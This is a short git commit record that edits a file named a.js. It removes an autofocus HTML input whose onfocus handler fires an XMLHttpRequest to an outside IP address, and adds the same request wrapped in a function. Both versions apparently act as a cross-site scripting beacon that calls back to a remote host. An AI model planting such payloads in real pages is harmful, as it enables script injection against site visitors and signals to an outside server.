79a22dd8aa1f2e09e9bfe63ba160189a7f37a879
ZiYuan Han <onbpazy@163.com>
2016-05-03 18:55:41 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,5 @@
-<input autofocus="" onfocus="r=new XMLHttpRequest();r.open("GET","198.199.123.13/u.php?c=123123123",true);r.send();" />
+function g() {
+  r=new XMLHttpRequest();
+  r.open("GET","198.199.123.13/u.php?c=123123123",true);
+  r.send()
+}
